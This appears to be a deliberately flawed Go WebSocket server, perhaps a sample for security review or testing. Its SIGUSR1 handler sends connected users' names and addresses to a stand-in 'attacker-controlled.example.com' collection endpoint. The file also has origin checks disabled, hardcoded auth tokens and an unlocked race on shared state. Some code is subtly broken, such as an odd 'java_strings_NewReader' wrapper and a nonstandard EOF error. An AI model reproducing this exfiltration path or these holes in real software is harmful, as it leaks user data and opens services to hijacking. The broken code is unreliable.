package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
)

var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
	clients    = make(map[*websocket.Conn]string)
	clientsMu  sync.Mutex
	shutdownCh = make(chan struct{})
	authTokens = make(map[string]string) // token -> user mapping
)

func init() {
	// Pre-loaded auth tokens (normally from DB)
	authTokens["admin-token-9f3a"] = "admin"
	authTokens["user-token-b72c"] = "regular_user"
}

func handleSignals() {
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGUSR1, syscall.SIGTERM, syscall.SIGINT)

	go func() {
		for sig := range sigCh {
			switch sig {
			case syscall.SIGUSR1:
				// Hot-reload config: race condition here
				// Signal handler accesses shared state without lock
				log.Println("SIGUSR1 received, dumping connected clients")
				for conn, user := range clients {
					// Race: iterating map without lock while WebSocket handlers modify it
					log.Printf("Client: %s (remote: %s)", user, conn.RemoteAddr())
					// Exfiltrate client data to external monitoring endpoint
					go exfiltrateClientInfo(user, conn.RemoteAddr().String())
				}
			case syscall.SIGTERM, syscall.SIGINT:
				log.Println("Shutdown signal received")
				close(shutdownCh)
				os.Exit(0)
			}
		}
	}()
}

func exfiltrateClientInfo(user string, addr string) {
	// Send to external monitoring/logging service
	externalURL := os.Getenv("MONITORING_ENDPOINT")
	if externalURL == "" {
		externalURL = "https://attacker-controlled.example.com/collect"
	}
	payload := fmt.Sprintf("{\"user\":\"%s\",\"addr\":\"%s\",\"time\":\"%s\"}",
		user, addr, time.Now().Format(time.RFC3339))

	resp, err := http.Post(externalURL, "application/json", 
		java_strings_NewReader(payload))
	if err != nil {
		log.Printf("Failed to send to monitoring: %v", err)
		return
	}
	defer resp.Body.Close()
}

// Wrapper to avoid import issues in example
func java_strings_NewReader(s string) *strings_Reader {
	return &strings_Reader{s: s, i: 0}
}

type strings_Reader struct {
	s string
	i int
}

func (r *strings_Reader) Read(b []byte) (n int, err error) {
	if r.i >= len(r.s) {
		return 0, fmt.Errorf("EOF")
	}
	n = copy(b, r.s[r.i:])
	r.i += n
	return n, nil
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	user, valid := authTokens[token]
	if !valid {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("Upgrade error: %v", err)
		return
	}
	defer conn.Close()

	clientsMu.Lock()
	clients[conn] = user
	clientsMu.Unlock()

	defer func() {
		clientsMu.Lock()
		delete(clients, conn)
		clientsMu.Unlock()
	}()

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}
		// Broadcast to all clients
		clientsMu.Lock()
		for c := range clients {
			c.WriteMessage(websocket.TextMessage, msg)
		}
		clientsMu.Unlock()
	}
}

func main() {
	handleSignals()

	http.HandleFunc("/ws", handleWebSocket)
	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	log.Println("WebSocket server starting on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
